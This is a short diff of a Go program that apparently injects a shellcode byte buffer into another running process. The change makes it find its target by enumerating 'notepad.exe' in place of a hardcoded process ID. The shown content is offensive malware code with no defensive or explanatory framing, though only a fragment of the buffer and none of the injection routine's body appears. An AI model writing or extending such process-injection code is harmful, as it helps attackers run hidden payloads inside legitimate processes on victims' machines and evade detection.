@@ -32,6 +32,6 @@ var buf = []byte{0xeb, 0x27, 0x5b, 0x53, 0x5f, 0xb0, 0x99, 0xfc, 0xae,
 //params : buffer, buffer size, PID
 
 func main() {
-	processInjection(10096, &buf[0], uintptr(len(buf)))
-
+	processInjection(uintptr(processEnumeration("notepad.exe")), &buf[0], uintptr(len(buf)))
+	//fmt.Println(processEnumeration("notepad.exe"))
 }
